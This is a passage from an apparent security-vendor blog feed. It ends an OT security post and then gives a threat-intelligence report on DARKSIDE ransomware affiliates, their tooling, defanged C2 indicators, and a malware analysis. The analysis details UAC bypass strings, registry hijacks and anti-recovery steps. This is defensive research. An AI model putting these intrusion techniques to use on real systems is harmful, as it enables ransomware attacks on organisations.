  Sophistication Compromises</h4>
 <p>Defense against low sophistication compromises is best addressed by
  implementing security best practices and gaining situational awareness
  about the threat exposure of assets and data. Implementing security
  controls to defend against this activity is also the foundation for
  mature security programs that seek to prevent and identify complex OT
  threats before they introduce a risk to the safety of people and infrastructure.</p>
 <ul> <li>Whenever feasible, remove OT assets from public-facing
    networks. If remote access is required, deploy access controls and
    monitor traffic for unusual activity to minimize unintended
    interaction and safeguard asset information.</li> <li>Apply common
    network-hardening techniques to remotely accessible and edge
    devices, such as disabling unused services, changing default
    credentials, reviewing asset configurations, and creating whitelists
    for access.</li> <li>Determine if relevant assets are discoverable
    using online scanners such as Shodan and Censys. Leverage support
    from knowledgeable security researchers to identify exposed assets
    and leaked information. Mandiant Threat Intelligence offers
    subscription content, custom analysis, and black box assessments
    that help organizations identify internet-exposed assets and
  information.</li> <li>Maintain situational awareness on threat actors’
    interest in cyber physical systems and the development of <a
      href="/content/fireeye-www/en_US/blog/threat-research/2020/03/monitoring-ics-cyber-operation-tools-and-software-exploit-modules.html">OT
    exploits</a>, with particular interest in attention driven to your
    organization, third party providers, or original equipment
    manufacturers (OEM).</li> <li>Configure HMIs and other control
    system assets to enforce acceptable input ranges and prohibit
    hazardous variable states. Similar to web application security,
    automation programmers should treat all operator input as
    potentially malicious and gain security assurances by validating
    that the operator input is within acceptable thresholds.</li> </ul>
 <p>Visit our website to learn more about <a
    href="/content/fireeye-www/en_US/products/industrial-systems-and-critical-infrastructure-security.html">Mandiant’s
    OT security practice</a> or contact us directly to request <a
    href="/content/fireeye-www/en_US/mandiant.html">Mandiant
    services</a> or <a
    href="/content/fireeye-www/en_US/mandiant/threat-intelligence.html">threat intelligence</a>.</p>
http://www.fireeye.com/blog/threat-research/2021/05/increasing-low-sophistication-operational-technology-compromises.html2021-05-25T14:00:00.000Z2021-05-24T17:09:07.326ZShining a Light on DARKSIDE Ransomware Operationsnoemail@noemail.orgJordan Nuce<p>
  <i>Update (May 14): Mandiant has observed multiple actors cite a May
    13 announcement that appeared to be shared with DARKSIDE RaaS
    affiliates by the operators of the service. This announcement stated
    that they lost access to their infrastructure, including their blog,
    payment, and CDN servers, and would be closing their service.
    Decrypters would also be provided for companies who have not paid,
    possibly to their affiliates to distribute. The post cited law
    enforcement pressure and pressure from the United States for this
    decision. We have not independently validated these claims and there
    is some speculation by other actors that this could be an exit scam.</i></p>
 <h4>Background</h4>
 <p>Since initially surfacing in August 2020, the creators of DARKSIDE
  ransomware and their affiliates have launched a global crime spree
  affecting organizations in more than 15 countries and multiple
  industry verticals. Like many of their peers, these actors conduct
  multifaceted extortion where data is both exfiltrated and encrypted in
  place, allowing them to demand payment for unlocking and the
  non-release of stolen data to exert more pressure on victims.</p>
 <p>The origins of these incidents are not monolithic. DARKSIDE
  ransomware operates as a ransomware-as-a-service (RaaS) wherein profit
  is shared between its owners and partners, or affiliates, who provide
  access to organizations and deploy the ransomware. Mandiant currently
  tracks multiple threat clusters that have deployed this ransomware,
  which is consistent with multiple affiliates using DARKSIDE. These
  clusters demonstrated varying levels of technical sophistication
  throughout intrusions. While the threat actors commonly relied on
  commercially available and legitimate tools to facilitate various
  stages of their operations, at least one of the threat clusters also
  employed a now patched zero-day vulnerability.</p>
 <p>Reporting on DARKSIDE has been available in advance of this blog
  post to users of <a
    href="/content/fireeye-www/en_US/mandiant/threat-intelligence.html">Mandiant
    Advantage Free</a>, a no-cost version of our threat intelligence platform.</p>
 <h4>Targeting</h4>
 <p>Mandiant has identified multiple DARKSIDE victims through our
  incident response engagements and from reports on the DARKSIDE blog.
  Most of the victim organizations were based in the United States and
  span across multiple sectors, including financial services, legal,
  manufacturing, professional services, retail, and technology. The
  number of publicly named victims on the DARKSIDE blog has increased
  overall since August 2020, with the exception of a significant dip in
  the number of victims named during January 2021 (Figure 1). It is
  plausible that the decline in January was due to threat actors using
  DARKSIDE taking a break during the holiday season. The overall growth
  in the number of victims demonstrates the increasing use of the
  DARKSIDE ransomware by multiple affiliates.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/darkside/fig1.png" alt="" />
  <br /> <span class="type-XS">Figure 1: Known DARKSIDE victims (August
    2020 to April 2021)</span></p>
 <h4>DARKSIDE Ransomware Service</h4>
 <p>Beginning in November 2020, the Russian-speaking actor
  &quot;darksupp&quot; advertised DARKSIDE RaaS on the Russian-language
  forums exploit.in and xss.is. In April 2021, darksupp posted an update
  for the &quot;Darkside 2.0&quot; RaaS that included several new
  features and a description of the types of partners and services they
  were currently seeking (Table 1). Affiliates retain a percentage of
  the ransom fee from each victim. Based on forum advertisements, the
  RaaS operators take 25% for ransom fees less than $500,000, but this
  decreases to 10 percent for ransom fees greater than $5 million.</p>
 <p>In addition to providing builds of DARKSIDE ransomware, the
  operators of this service also maintain a blog accessible via TOR. The
  actors use this site to publicize victims in an attempt to
  pressure these organizations into paying for the non-release of stolen
  data. A recent update to their underground forum advertisement also
  indicates that actors may attempt to DDoS victim organizations. The
  actor darksupp has stated that affiliates are prohibited from
  targeting hospitals, schools, universities, non-profit organizations,
  and public sector entities. This may be an effort by the actor(s) to
  deter law enforcement action, since targeting of these sectors may
  invite additional scrutiny. Affiliates are also prohibited from
  targeting organizations in Commonwealth of Independent States (CIS) nations.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="167"><p>
          <b>Advertisement Date/Version</b></p> </td> <td width="312"><p>
          <b>Feature/Update</b></p> </td> <td width="143"><p>
          <b>Related Reporting</b></p> </td> </tr>
    <tr>
      <td width="167" rowspan="4"><p>Nov. 10, 2020 (V1)</p> <p> </p>
      </td> <td width="312"><p>Ability to generate builds for both
          Windows and Linux environments from within the administration
        panel. </p> </td> <td width="143" rowspan="4"><p>
          <a
        href="https://advantage.mandiant.com/reports/20-00023273">20-00023273</a></p>
      </td> </tr>
    <tr>
      <td width="312"><p>Encrypts files using Salsa20 encryption along
          with an RSA-1024 public key</p> </td> </tr>
    <tr>
      <td width="312"><p>Access to an administrative panel via TOR that
          can be used by clients to manage Darkside builds, payments,
          blog posts, and communication with victims</p> </td> </tr>
    <tr>
      <td width="312"><p>The admin panel includes a Blog section that
          allows clients to publish victim information and announcements
          to the Darkside website for the purposes of shaming victims
          and coercing them to pay ransom demands</p> </td> </tr>
    <tr>
      <td width="167" rowspan="3"><p>April 14, 2021 (V2.0)</p> <p> </p>
      </td> <td width="312"><p>Automated test decryption. The process
          from encryption to withdrawal of money is automated and no
          longer relies on support.</p> </td> <td width="143" rowspan="3"><p>
          <a
        href="https://advantage.mandiant.com/reports/21-00008435">21-00008435</a></p>
      </td> </tr>
    <tr>
      <td width="312"><p>Available DDoS of targets (Layer 3, Layer
        7)</p> </td> </tr>
    <tr>
      <td width="312"><p>Sought a partner to provide network accesses to
          them and a person or team with pentesting skills</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Table 1: Notable features and updates listed on
    DARKSIDE advertisement thread (exploit.in)</span></p>
 <p>
  <i>DARKSIDE Affiliates</i></p>
 <p>DARKSIDE RaaS affiliates are required to pass an interview after
  which they are provided access to an administration panel (Figure 2).
  Within this panel, affiliates can perform various actions such as
  creating a ransomware build, specifying content for the DARKSIDE blog,
  managing victims, and contacting support. Mandiant has identified at
  least five Russian-speaking actors who may currently, or have
  previously, been DARKSIDE affiliates. Relevant advertisements
  associated with a portion of these threat actors have been aimed at
  finding either initial access providers or actors capable of deploying
  ransomware on accesses already obtained. Some actors claiming to use
  DARKSIDE have also allegedly partnered with other RaaS affiliate
  programs, including BABUK and SODINOKIBI (aka REvil). For more
  information on these threat actors, please see <a
    href="https://advantage.mandiant.com/reports/21-00009431">Mandiant Advantage</a>.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/darkside/fig2.png" alt="" />
  <br /> <span class="type-XS">Figure 2: DARKSIDE affiliate panel</span></p>
 <h4>Attack Lifecycle</h4>
 <p>Mandiant currently tracks five clusters of threat activity that have
  involved the deployment of DARKSIDE. For more information on
  uncategorized threats, refer to our post, &quot;<a
    href="/content/fireeye-www/en_US/blog/products-and-services/2020/12/how-mandiant-tracks-uncategorized-threat-actors.html">DebUNCing
    Attribution: How Mandiant Tracks Uncategorized Threat
  Actors</a>.&quot; These clusters may represent different affiliates of
  the DARKSIDE RaaS platform. Throughout observed incidents, the threat
  actor commonly relied on various publicly available and legitimate
  tools that are commonly used to facilitate various stages of the
  attack lifecycle in post-exploitation ransomware attacks (Figure 3).
  Additional details on three of these UNC groups are included below.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/darkside/fig3b.png" alt="" />
  <span class="type-XS">
    <br /> Figure 3: TTPs seen throughout DARKSIDE ransomware engagements</span></p>
 <p>
  <i>UNC2628</i></p>
 <p>UNC2628 has been active since at least February 2021. Their
  intrusions progress relatively quickly with the threat actor typically
  deploying ransomware in two to three days. We have some evidence that
  suggests UNC2628 has partnered with other RaaS including SODINOKIBI
  (REvil) and NETWALKER.</p>
 <ul> <li>In multiple cases we have observed suspicious authentication
    attempts against corporate VPN infrastructure immediately prior to
    the start of interactive intrusion operations. The authentication
    patterns were consistent with a password spraying attack, though
    available forensic evidence was insufficient to definitively
    attribute this precursor activity to UNC2628.</li> <li>In cases
    where evidence was available, the threat actor appeared to obtain
    initial access through corporate VPN infrastructure using legitimate
  credentials.</li> <li>UNC2628 has interacted with victim environments
    using various legitimate accounts, but in multiple cases has also
    created and used a domain account with the username 'spservice'.
    Across all known intrusions, UNC2628 has made heavy use of the
    Cobalt Strike framework and BEACON payloads. BEACON command and
    control (C2) infrastructure attributed to this actor has included
    the following:<ul> <li>hxxps://104.193.252[.]197:443/</li>
      <li>hxxps://162.244.81[.]253:443/</li>
      <li>hxxps://185.180.197[.]86:443/</li>
      <li>hxxps://athaliaoriginals[.]com/</li>
      <li>hxxps://lagrom[.]com:443/font.html</li>
      <li>hxxps://lagrom[.]com:443/night.html</li>
      <li>hxxps://lagrom[.]com:443/online.html</li>
      <li>hxxps://lagrom[.]com:443/send.html</li>
      <li>hxxps://lagrom[.]com/find.html?key=id#-</li> </ul> </li>
    <li>In at least some cases there is evidence to suggest this actor
    has employed Mimikatz for credential theft and privilege
  escalation.</li> <li>The threat actor appeared to have used built-in
    commands such as ‘net’ and ‘ping’ to perform basic reconnaissance of
    the internal network, though it is likely that additional
    reconnaissance was performed via BEACON and not represented in
    available log sources.</li> <li>UNC2628 has moved laterally in
    environments almost exclusively via RDP using legitimate credentials
    and Cobalt Strike BEACON payloads. This threat cluster uses both
    HTTPS BEACON payloads and SMB BEACON, the latter almost exclusively
    using named pipes beginning with “\\.\pipe\UIA_PIPE_”</li>
    <li>Intrusions attributed to this threat cluster have progressed
    swiftly from intrusion to data theft and ransomware deployment, and
    have thus not focused heavily on maintaining a persistent foothold
    in impacted environments.  Despite this, UNC2628 has maintained
    access via the collection of legitimate credentials, the creation of
    attacker-controlled domain accounts (spservice), and via the
    creation of Windows services intended to launch BEACON. Notably,
    UNC2628 has repeatedly loaded BEACON with a service named
  ‘CitrixInit’.</li> <li>UNC2628 has also employed <a>F-Secure Lab</a>s'
    Custom Command and Control (C3) framework, deploying relays
    configured to proxy C2 communications through the Slack API. Based
    on this actor's other TTPs they were likely using C3 to obfuscate
    Cobalt Strike BEACON traffic.</li> <li>The threat actor has
    exfiltrated data over SFTP using Rclone to systems in cloud hosting
    environments. Rclone is a command line utility to manage files for
    cloud storage applications. Notably, the infrastructure used for
    data exfiltration has been reused across multiple intrusions. In one
    case, the data exfiltration occurred on the same day that the
    intrusion began.</li> <li>UNC2628 deploys DARKSIDE ransomware
    encryptors using PsExec to a list of hosts contained in multiple
    text files.</li> <li>The threat actor has used the following
    directories, placing copies of backdoors, ransomware binaries,
    copies of PsExec, and lists of victim hosts within them.<ul>
      <li>C:\run\</li> <li>C:\home\</li> <li>C:\tara\</li>
      <li>C:\Users\[username]\Music\</li> <li>C:\Users\Public</li> </ul>
  </li> </ul>
 <p>
  <i>UNC2659</i></p>
 <p>UNC2659 has been active since at least January 2021. We have
  observed the threat actor move through the whole attack lifecycle in
  under 10 days. UNC2659 is notable given their use of an exploit in the
  SonicWall SMA100 SSL VPN product, which has since been <a
  href="https://www.sonicwall.com/support/product-notification/additional-sma-100-series-10-x-and-9-x-firmware-updates-required-updated-april-29-2021-12-30-p-m-cst/210122173415410/">patched</a>
  by SonicWall. The threat actor appeared to download several tools used
  for various phases of the attack lifecycle directly from those tools’
  legitimate public websites.</p>
 <ul> <li>The threat actor obtained initial access to their victim by
    exploiting <a
    href="https://intelligence.fireeye.com/reports/21-00008254">CVE-2021-20016</a>,
    an exploit in the SonicWall SMA100 SSL VPN product, which has been
      <a
    href="https://www.sonicwall.com/support/product-notification/additional-sma-100-series-10-x-and-9-x-firmware-updates-required-updated-april-29-2021-12-30-p-m-cst/210122173415410/">patched</a>
    by SonicWall. There is some evidence to suggest the threat actor may
    have used the vulnerability to disable multi-factor authentication
    options on the SonicWall VPN, although this has not been
  confirmed.</li> <li>The threat actor leveraged TeamViewer
    (TeamViewer_Setup.exe) to establish persistence within the victim
    environment. Available evidence suggests that the threat actor
    downloaded TeamViewer directly from the following URL and also
    browsed for locations from which they could download the AnyDesk
      utility.<ul>
      <li>hxxps://dl.teamviewer[.]com/download/version_15x/TeamViewer_Setup.exe</li>
    </ul> </li> <li>The threat actor appeared to download the file
    rclone.exe directly from rclone[.]org -
    hxxps://downloads.rclone[.]org/v1.54.0/rclone-v1.54.0-windows-amd64.zip.
    The threat actors were seen using rclone to exfiltrate hundreds of
    gigabytes of data over the SMB protocol to the pCloud cloud-based
    hosting and storage service.</li> <li>The threat actor deployed the
    file power_encryptor.exe in a victim environment, encrypting files
    and creating ransom notes over the SMB protocol.</li> <li>Mandiant
    observed the threat actor navigate to ESXi administration interfaces
    and disable snapshot features prior to the ransomware encryptor
    deployment, which affected several VM images.</li> </ul>
 <p>
  <i>UNC2465</i></p>
 <p>UNC2465 activity dates back to at least April 2019 and is
  characterized by their use of similar TTPs to distribute the
  PowerShell-based .NET backdoor SMOKEDHAM in victim environments. In
  one case where DARKSIDE was deployed, there were months-long gaps,
  with only intermittent activity between the time of initial compromise
  to ransomware deployment. In some cases, this could indicate that
  initial access was provided by a separate actor.</p>
 <ul> <li>UNC2465 used phishing emails and legitimate services to
    deliver the SMOKEDHAM backdoor. SMOKEDHAM is a .NET backdoor that
    supports keylogging, taking screenshots, and executing arbitrary
    .NET commands. During one incident, the threat actor appeared to
    establish a line of communication with the victim before sending a
    malicious Google Drive link delivering an archive containing an LNK
    downloader. More recent UNC2465 emails have used Dropbox links with
    a ZIP archive containing malicious LNK files that, when executed,
    would ultimately lead to SMOKEDHAM being downloaded onto the
  system.  </li> <li>UNC2465 has used Advanced IP Scanner, BLOODHOUND,
    and RDP for internal reconnaissance and lateral movement activities
    within victim environments.</li> <li>The threat actor has used
    Mimikatz for credential harvesting to escalate privileges in the
    victim network.</li> <li>UNC2465 also uses the publicly available
    NGROK utility to bypass firewalls and expose remote desktop service
    ports, like RDP and WinRM, to the open internet.</li> <li>Mandiant
    has observed the threat actor using PsExec and cron jobs to deploy
    the DARKSIDE ransomware.</li> <li>UNC2465 has called the customer
    support lines of victims and told them that data was stolen and
    instructed them to follow the link in the ransom note.</li> </ul>
 <h4>Implications</h4>
 <p>We believe that threat actors have become more proficient at
  conducting multifaceted extortion operations and that this success has
  directly contributed to the rapid increase in the number of
  high-impact ransomware incidents over the past few years. Ransomware
  operators have incorporated additional extortion tactics designed to
  increase the likelihood that victims will acquiesce to paying the
  ransom prices. As one example, in late April 2021, the DARKSIDE
  operators released a press release stating that they were targeting
  organizations listed on the NASDAQ and other stock markets. They
  indicated that they would be willing to give stock traders information
  about upcoming leaks in order to allow them potential profits due to
  stock price drops after an announced breach. In another notable
  example, an attacker was able to obtain the victim's cyber insurance
  policy and leveraged this information during the ransom negotiation
  process refusing to lower the ransom amount given their knowledge of
  the policy limits. This reinforces that during the post-exploitation
  phase of ransomware incidents, threat actors can engage in internal
  reconnaissance and obtain data to increase their negotiating power. We
  expect that the extortion tactics that threat actors use to pressure
  victims will continue to evolve throughout 2021.</p>
 <p>Based on the evidence that DARKSIDE ransomware is distributed by
  multiple actors, we anticipate that the TTPs used throughout incidents
  associated with this ransomware will continue to vary somewhat. For
  more comprehensive recommendations for addressing ransomware, please
  refer to our blog post: &quot;<a
    href="/content/fireeye-www/en_US/blog/threat-research/2019/09/ransomware-protection-and-containment-strategies.html">Ransomware
    Protection and Containment Strategies: Practical Guidance for
    Endpoint Protection, Hardening, and Containment</a>&quot; and the
    linked <a
    href="https://www.fireeye.com/content/dam/fireeye-www/current-threats/pdfs/wp-ransomware-protection-and-containment-strategies.pdf">white paper</a>.</p>
 <h4>Acknowledgements</h4>
 <p>Beyond the comparatively small number of people who are listed as
  authors on this report are hundreds of consultants, analysts and
  reverse-engineers who tirelessly put in the work needed to respond to
  intrusions at breakneck pace and still maintain unbelievably high
  analytical standards. This larger group has set the foundation for all
  of our work, but a smaller group of people contributed more directly
  to producing this report and we would like to thank them by name. We
  would like to specifically thank Bryce Abdo and Matthew Dunwoody from
  our Advanced Practices team and Jay Smith from FLARE, all of whom
  provided analytical support and technical review. Notable support was
  also provided by Ioana Teaca, and Muhammadumer Khan.</p>
 <h4>Appendix A: DARKSIDE Ransomware Analysis</h4>
 <p>DARKSIDE is a ransomware written in C that may be configured to
  encrypt files on fixed and removable disks as well as network shares.
  DARKSIDE RaaS affiliates are given access to an administration panel
  on which they create builds for specific victims. The panel allows
  some degree of customization for each ransomware build such as
  choosing the encryption mode and whether local disks and network
  shares should be encrypted (Figures 4). The following malware analysis
  is based on the file MD5: 1a700f845849e573ab3148daef1a3b0b. A more
  recently analyzed DARKSIDE sample had the following notable differences:</p>
 <ul> <li>The option for beaconing to a C2 server was disabled and the
    configuration entry that would have contained a C2 server was
  removed.</li> <li>Included a persistence mechanism in which the
    malware creates and launches itself as a service.</li> <li>Contained
    a set of hard-coded victim credentials that were used to attempt to
    logon as a local user. If the user token retrieved based on the
    stolen credentials is an admin token and is part of the domain
    administrators' group, it is used for network enumeration and file
    permission access.</li> </ul>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/darkside/fig4.png" alt="" />
  <br /> <span class="type-XS">Figure 4: DARKSIDE build configuration
    options appearing in the administration panel</span></p>
 <h5>Host-Based Indicators</h5>
 <p>
  <i>Persistence Mechanism</i></p>
 <p>Early versions of the malware did not contain a persistence
  mechanism. An external tool or installer was required if the attacker
  desired persistence. A DARKSIDE version observed in May 2021 implement
  a persistence mechanism through which the malware creates and launches
  itself as a service with a service name and description named using
  eight pseudo-randomly defined lowercase hexadecimal characters (e.g.,
  &quot;.e98fc8f7&quot;) that are also appended by the malware to
  various other artifacts it created.  This string of characters is
  referenced as <i>&lt;ransom_ext&gt;</i>. :</p>
 <p style="margin-left: 40.0px;">Service Name: &lt;ransom_ext&gt;<br />
  Description: &lt;ransom_ext&gt;</p>
 <h5>Filesystem Artifacts</h5>
 <p>
  <i>Created Files</i></p>
 <p style="margin-left: 40.0px;">%CD%\LOG&lt;ransom_ext&gt;.TXT<br />
  README&lt;ransom_ext&gt;.TXT<br />
  &lt;original_filename_plus_ext&gt;&lt;ransom_ext&gt;<br /> May
  version: %PROGRAMDATA%\&lt;ransom_ext&gt;.ico</p>
 <p>
  <i>Registry Artifacts</i></p>
 <p>The DARKSIDE version observed in May sets the following registry key:</p>
 <p>HKCR\&lt;ransom_ext&gt;\DefaultIcon\&lt;ransom_ext&gt;\DefaultIcon=%PROGRAMDATA%\&lt;ransom_ext&gt;.ico</p>
 <h5>Details</h5>
 <p>
  <i>Configuration</i></p>
 <p>The malware initializes a 0x100-byte keystream used to decrypt
  strings and configuration data. Strings are decrypted as needed and
  overwritten with NULL bytes after use. The malware's configuration
  size is 0xBE9 bytes. A portion of the decrypted configuration is shown
  in Figure 5.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="623" valign="top"><span class="code">00000000  01 00 01
          00 00 00 00 00 00 00 00 00 00 00 00 00  ................<br />
          00000010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
          ................<br />  00000020  00 00 00 00 00 00 00 00 00
          00 00 00 00 00 00 00  ................<br />  00000030  00 00
          00 00 00 00 00 00 00 00 00 00 00 00 00 00 
          ................<br />  00000040  00 00 00 00 00 00 00 00 00
          00 00 00 00 00 00 00  ................<br />  00000050  00 00
          00 00 00 00 00 00 00 00 00 00 00 00 00 00 
          ................<br />  00000060  00 00 00 00 00 00 00 00 00
          00 00 00 00 00 00 00  ................<br />  00000070  00 00
          00 00 00 00 00 00 00 00 00 00 00 00 00 00 
          ................<br />  00000080  95 AA A8 7C 2B 6A D5 12 0E
          73 B3 7D BD 16 25 62  •ª¨|+jÕ..s³}½.%b<br />  00000090  A4 A8
          BF 19 73 F7 E0 BC DF 02 A8 94 32 CF 0C C0 
          ¤¨¿.s÷à¼ß.¨&quot;2Ï.À<br />  000000A0  C5 83 0F 14 66 02 87 EE
          FD 29 96 DF 02 05 C1 12  Åƒ..f.‡îý)–ß..Á.<br />  000000B0  3E
          43 A7 59 E1 F0 C4 5D AE E1 20 2E 77 D9 CA 3C  &gt;C§YáðÄ]®á
          .wÙÊ&lt;<br />  000000C0  AD C6 BC 84 75 1C E7 0B F0 30 2A 51
          13 7A B2 66  .Æ¼„u.ç.ð0*Q.z²f<br />  000000D0  44 73 79 E1 E4
          69 C3 CA 1B C1 76 63 65 95 EA CA  DsyáäiÃÊ.Ávce•êÊ<br />
          000000E0  F6 10 68 0D CE 36 61 F9 57 B9 19 50 31 D4 E1 70 
          ö.h.Î6aùW¹.P1Ôáp<br />  000000F0  EC 7B 33 1E 4F 17 E1 80 1D
          BC CF 8C D8 C5 66 41  ì{3.O.á€.¼ÏŒØÅfA<br />  00000100  E5 0A
          00 00 02 6E 01 02 15 03 43 01 8E 24 0E 72 
          å....n....C.Ž$.r<br />  &lt;cut&gt;</span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 5: Partial decrypted configuration</span></p>
 <p>The sample's 0x80-byte RSA public key blob begins at offset 0x80.
  The DWORD value at offset 0x100 is multiplied by 64 and an amount of
  memory equivalent to the result is allocated. The remaining bytes,
  which start at offset 0x104, are aPLib-decompressed into the allocated
  buffer. The decompressed bytes include the ransom note and other
  elements of the malware's configuration described as follows (e.g.,
  processes to terminate, files to ignore). The first 0x60 bytes of the
  decompressed configuration are shown in Figure 6.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="623" valign="top"><span class="code">00000000  02 01 01
          01 00 01 01 00 01 01 01 01 01 01 01 01  ................<br />
          00000010  01 01 01 01 01 01 24 00 72 00 65 00 63 00 79 00 
          ......$.r.e.c.y.<br />  00000020  63 00 6C 00 65 00 2E 00 62
          00 69 00 6E 00 00 00  c.l.e...b.i.n...<br />  00000030  63 00
          6F 00 6E 00 66 00 69 00 67 00 2E 00 6D 00 
          c.o.n.f.i.g...m.<br />  00000040  73 00 69 00 00 00 24 00 77
          00 69 00 6E 00 64 00  s.i...$.w.i.n.d.<br />  00000050  6F 00
          77 00 73 00 2E 00 7E 00 62 00 74 00 00 00 
          o.w.s...~.b.t...<br />  &lt;cut&gt;</span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 6: Partial decompressed configuration</span></p>
 <p>The first byte from Figure 6 indicates the encryption mode. This
  sample is configured to encrypt using FAST mode. Supported values are
  as follows:</p>
 <ul> <li>1: FULL</li> <li>2: FAST</li> <li>Other values: AUTO</li> </ul>
 <p>The individual bytes from offset 0x02 to offset 0x15 in Figure 6 are
  Boolean values that dictate the malware's behavior. The malware takes
  the actions listed in Table 2 based on these values. Table 2 also
  identifies features that are enabled or disabled for the current sample.</p>
 <table border="1" cellspacing="0" cellpadding="0" width="644"> <tbody>
    <tr>
      <td width="65"><p>
          <b>Offset</b></p> </td> <td width="77"><p>
          <b>Enabled</b></p> </td> <td width="502"><p>
          <b>Description</b></p> </td> </tr>
    <tr>
      <td width="65"><p>0x01</p> </td> <td width="77"><p>Yes</p> </td>
        <td width="502"><p>Unknown</p> </td> </tr>
    <tr>
      <td width="65"><p>0x02</p> </td> <td width="77"><p>Yes</p> </td>
        <td width="502"><p>Encrypt local disks</p> </td> </tr>
    <tr>
      <td width="65"><p>0x03</p> </td> <td width="77"><p>Yes</p> </td>
        <td width="502"><p>Encrypt network shares</p> </td> </tr>
    <tr>
      <td width="65"><p>0x04</p> </td> <td width="77"><p>No</p> </td>
        <td width="502"><p>Perform language check</p> </td> </tr>
    <tr>
      <td width="65"><p>0x05</p> </td> <td width="77"><p>Yes</p> </td>
        <td width="502"><p>Delete volume shadow copies</p> </td> </tr>
    <tr>
      <td width="65"><p>0x06</p> </td> <td width="77"><p>Yes</p> </td>
        <td width="502"><p>Empty Recycle Bins</p> </td> </tr>
    <tr>
      <td width="65"><p>0x07</p> </td> <td width="77"><p>No</p> </td>
        <td width="502"><p>Self-delete</p> </td> </tr>
    <tr>
      <td width="65"><p>0x08</p> </td> <td width="77"><p>Yes</p> </td>
        <td width="502"><p>Perform UAC bypass if necessary</p> </td> </tr>
    <tr>
      <td width="65"><p>0x09</p> </td> <td width="77"><p>Yes</p> </td>
        <td width="502"><p>Adjust token privileges</p> </td> </tr>
    <tr>
      <td width="65"><p>0x0A</p> </td> <td width="77"><p>Yes</p> </td>
        <td width="502"><p>Logging</p> </td> </tr>
    <tr>
      <td width="65"><p>0x0B</p> </td> <td width="77"><p>Yes</p> </td>
        <td width="502"><p>Feature not used but results in the following
          strings being decrypted:</p> <ul>
          <li>https://google.com/api/version</li>
          <li>https://yahoo.com/v2/api</li> </ul> </td> </tr>
    <tr>
      <td width="65"><p>0x0C</p> </td> <td width="77"><p>Yes</p> </td>
        <td width="502"><p>Ignore specific folders</p> </td> </tr>
    <tr>
      <td width="65"><p>0x0D</p> </td> <td width="77"><p>Yes</p> </td>
        <td width="502"><p>Ignore specific files</p> </td> </tr>
    <tr>
      <td width="65"><p>0x0E</p> </td> <td width="77"><p>Yes</p> </td>
        <td width="502"><p>Ignore specific file extensions</p> </td> </tr>
    <tr>
      <td width="65"><p>0x0F</p> </td> <td width="77"><p>Yes</p> </td>
        <td width="502"><p>Feature not used; related to these strings:
          &quot;backup&quot; and &quot;here_backups&quot;</p> </td> </tr>
    <tr>
      <td width="65"><p>0x10</p> </td> <td width="77"><p>Yes</p> </td>
        <td width="502"><p>Feature not used: related to these strings:
          &quot;sql&quot; and &quot;sqlite&quot;</p> </td> </tr>
    <tr>
      <td width="65"><p>0x11</p> </td> <td width="77"><p>Yes</p> </td>
        <td width="502"><p>Terminate processes</p> </td> </tr>
    <tr>
      <td width="65"><p>0x12</p> </td> <td width="77"><p>Yes</p> </td>
        <td width="502"><p>Stop services</p> </td> </tr>
    <tr>
      <td width="65"><p>0x13</p> </td> <td width="77"><p>Yes</p> </td>
        <td width="502"><p>Feature not used; related to a buffer that
          contains the repeated string &quot;blah&quot;</p> </td> </tr>
    <tr>
      <td width="65"><p>0x14</p> </td> <td width="77"><p>Yes</p> </td>
        <td width="502"><p>Drop ransom note</p> </td> </tr>
    <tr>
      <td width="65"><p>0x15</p> </td> <td width="77"><p>Yes</p> </td>
        <td width="502"><p>Create a mutex</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Table 2: Configuration bits</span></p>
 <p>
  <i>UAC Bypass</i></p>
 <p>If the malware does not have elevated privileges, it attempts to
  perform one of two User Account Control (UAC) bypasses based on the
  operating system (OS) version. If the OS is older than Windows 10, the
  malware uses a documented <a
    href="https://www.rapid7.com/db/modules/exploit/windows/local/bypassuac_sluihijack"><i>slui.exe</i>
    file handler hijack technique</a>. This involves setting the
  registry value
  HKCU\Software\Classes\exefile\shell\open\command\Default to the
  malware path and executing <i>slui.exe</i> using the verb &quot;runas.&quot;</p>
 <p>If the OS version is Windows 10 or newer, the malware attempts a <a
    href="https://gist.github.com/api0cradle/d4aaef39db0d845627d819b2b6b30512">UAC
    bypass that uses the CMSTPLUA COM interface</a>. The decrypted
  strings listed in Figure 7 are used to perform this technique.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="623" valign="top"><p>Elevation:Administrator!new:<br />
        {3E5FC7F9-9A51-4367-9063-A120244FBEC7}</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 7: Decrypted UAC bypass strings</span></p>
 <p>
  <i>Encryption Setup</i></p>
 <p>The malware generates a pseudo-random file extension based on a MAC
  address on the system. In a DARKSIDE version observed in May 2021, the
  file extension is generated using a MachineGuid registry value as a
  seed rather than the MAC address. The file extension consists of eight
  lowercase hexadecimal characters (e.g., &quot;.e98fc8f7&quot;) and is
  referred to as <i>&lt;ransom_ext&gt;</i>. The file extension
  generation algorithm has been <a
    href="https://gist.github.com/Demonslay335/f82b8d9f94040b875ceb2386f9533362">recreated
    in Python</a>. If logging is enabled, the malware creates the log
  file <i>LOG&lt;ransom_ext&gt;.TXT</i> in its current directory.</p>
 <p>The malware supports the command line argument &quot;-path,&quot;
  which allows an attacker to specify a directory to target for encryption.</p>
 <p>The sample analyzed for this report is not configured to perform a
  system language check. If this functionality were enabled and the
  check succeeded, the string &quot;This is a Russian-Speaking System,
  Exit&quot; would be written to the log file and the malware would exit.</p>
 <p>
  <i>Anti-Recovery Techniques</i></p>
 <p>The malware locates and empties Recycle Bins on the system. If the
  process is running under WOW64, it executes the PowerShell command in
  Figure 8 using CreateProcess to delete volume shadow copies.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
